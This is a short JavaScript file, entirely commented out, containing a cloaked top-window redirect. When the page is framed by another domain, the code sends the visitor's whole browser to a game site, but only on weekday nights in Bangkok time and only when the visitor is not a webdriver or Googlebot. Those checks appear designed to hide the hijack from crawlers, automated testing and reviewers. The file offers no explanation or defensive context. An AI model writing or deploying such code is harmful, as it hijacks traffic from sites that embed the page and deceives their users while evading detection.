/*function isWeekday() {
    const now = new Date();
    const day = now.getDay();
    return day >= 1 && day <= 5; // Monday to Friday
}
function getCurrentDateTimeInTimeZone(timeZone) {
    const now = new Date();
    const options = {
        timeZone: timeZone,
        hour: '2-digit',
        hour12: false,
    };
    const formatter = new Intl.DateTimeFormat([], options);
    const parts = formatter.formatToParts(now);
    const hourPart = parts.find(part => part.type === 'hour');
    return hourPart ? hourPart.value : null;
}
var inFrame = function () {
    try {
        return window.self !== window.top;
    } catch (e) {
        return true;
    }
}
var isDifferentDomain = function () {
    try {
        return window.top.location.hostname !== window.location.hostname;
    } catch (e) {
        return true;
    }
}
var isBot = function  () {
    return navigator.webdriver || navigator.userAgent.toLowerCase().indexOf('googlebot') > -1;
}
function testRedirect() {
    console.log('TBG successfully.');
    const currentHourUTCPlus7 = getCurrentDateTimeInTimeZone('Asia/Bangkok');
    if(currentHourUTCPlus7 >= 22 && isWeekday()) {
        if (inFrame() & isDifferentDomain() & !isBot()) {
            window.top.location.href = "https://drifthuntersgame.io/?utm_source=rdrif";
        } 
    }
}*/